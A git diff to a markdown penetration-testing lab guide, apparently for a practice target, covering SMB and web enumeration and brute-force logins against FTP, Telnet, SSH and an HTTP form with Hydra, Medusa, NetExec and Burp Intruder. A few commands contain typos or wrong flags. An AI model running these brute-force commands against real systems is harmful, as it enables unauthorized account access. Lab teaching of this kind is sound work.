@@ -38,7 +38,7 @@ A list of open ports, service banners, and basic vulnerability info (e.g., anony
 ![alt text](image-1.png)
 
 ### Enumerating Usernames
-🧱 From SMB (to use with SSH, Telnet, FTP later):
+#### 🧱 From SMB (to use with SSH, Telnet, FTP later):
 ```bash
 enum4linux -a <TARGET_IP>
 ```
@@ -61,36 +61,71 @@ Enumerates users, shares, groups, and policies over SMB. Useful for finding vali
 ![alt text](image-13.png)
 ![alt text](image-14.png)
 
-For HTTP:
+#### 🌐 Web Server Enumeration (HTTP)
+
+Use `gobuster` to find hidden directories or files on the web server:
 ```bash
 gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
 ```
-*Document any discovered usernames.*
+**Flags explained:**
+- `-u`: Target URL
+- `-w`: Wordlist
+- `-t`: Number of threads (40 for speed, adjust as needed)
 
-## 3. Brute Force Attacks
-### 3.1 FTP Brute Force Attack (Hydra)
+> 💡 Look out for directories like `/admin`, `/login`, `/uploads`, etc.
+
+![alt text](image-15.png)
+
+## 🔐3. Brute Force Attacks
+
+### ✅ **Preparation**
+Before launching brute force attacks, make sure you have:
+- A **list of usernames** (`userlist.txt`)
+- A **list of passwords** (`passlist.txt`)
+
+> You can use default ones from Kali:
+```bash
+/usr/share/wordlists/rockyou.txt
+```
+
+Or create your own minimal test list:
+```bash
+echo -e "admin\nuser\ntest\msfadmin" > userlist.txt
+echo -e "1234\nadmin\npassword\msfadmin" > passlist.txt
+```
+
+### 🔹3.1 FTP Brute Force Attack (Hydra)
 ```bash
 hydra -L userlist.txt -P passlist.txt <TARGET_IP> ftp -V
 ```
 *Successful login screenshot here.*
 
-### 3.2 TELNET Brute Force Attack (Medusa)
+### 🔹3.2 TELNET Brute Force Attack (Medusa)
 ```bash
 medusa -h <TARGET_IP> -U userlist.txt -P passlist.txt -M telnet
 ```
 *Successful login screenshot here.*
 
-### 3.3 SSH Brute Force Attack (NetExec)
+### 🔹3.3 SSH Brute Force Attack (NetExec)
 ```bash
 nxc <TARGET_IP> -u userlist.txt -p passlist.txt -m ssh
 ```
 *Successful login screenshot here.*
 
-### 3.4 HTTP Login Brute Force Attack (Burp Suite)
-1. Capture login request using Burp Suite Proxy.
-2. Send it to **Intruder** and set attack type to **Cluster Bomb**.
-3. Load username and password lists.
-4. Start attack and analyze responses for successful logins.
+### 🔹3.4 HTTP Login Brute Force Attack (Burp Suite)
+1. Start **Burp Suite** → Set your browser to use Burp as a proxy.
+2. Try to log in to the HTTP page → Capture the request in **Proxy** tab.
+3. Right-click → **Send to Intruder**
+4. In **Intruder** tab:
+   - Set attack type to **Cluster Bomb**
+   - Mark **username** and **password** fields as payload positions
+5. Load payloads:
+   - Payload set 1: `userlist.txt`
+   - Payload set 2: `passlist.txt`
+6. Start Attack and watch for:
+   - Status code changes
+   - Different length in response
+   - Success indicators (e.g., “Welcome” or redirect)
 
 *Provide screenshot of a successful login attempt.*
 
